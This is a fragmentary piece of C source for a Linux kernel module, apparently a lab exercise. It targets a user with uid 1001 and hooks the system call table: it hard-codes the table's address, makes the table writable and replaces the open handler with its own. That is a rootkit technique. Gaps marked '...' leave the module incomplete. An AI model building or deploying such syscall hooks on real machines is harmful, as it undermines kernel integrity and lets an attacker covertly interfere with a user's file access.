...
//Global Variables
void **system_call_table_address;
int marks_uid = 1001;
...
{
  //Checking if current uid is User's uid
  kuid_t uid;
  uid.val = marks_uid;
  if(uid_eq(get_current_cred()->uid, uid)){
...
shady_init_module(void)
{
  ...
  //Setting the address
  system_call_table_address = (void *) 0xffffffff81801400;
  
  //Assign table_open to old_open
  old_open = system_call_table_address[__NR_open];

  //Allowing table to be writable
  set_addr_rw((unsigned long)system_call_table_address);
  
  //Assign my_open into table
